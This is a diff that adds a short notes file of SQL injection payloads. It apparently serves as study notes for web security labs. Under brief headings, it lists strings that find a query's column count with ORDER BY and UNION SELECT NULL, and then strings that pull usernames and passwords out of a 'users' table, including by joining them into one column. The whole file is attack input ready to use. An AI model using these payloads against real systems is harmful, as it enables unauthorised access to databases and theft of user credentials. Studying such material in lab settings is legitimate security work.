@@ -1,0 +1,13 @@
+determining the number of columns
+'+ORDER+BY+1--
+'+ORDER+BY+2--
+'+ORDER+BY+3--
+'+UNION+SELECT+NULL--
+'+UNION+SELECT+NULL,NULL--
+'+UNION+SELECT+NULL,NULL,NULL--
+using sql injection union attack to retrieve interesting data
+'+UNION+SELECT+username,password+FROM+users--
+'+UNION+SELECT+'abc','def'--
+retrieving mult val within a single column
+'+UNION+SELECT+username||'~'||password+FROM+users--
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
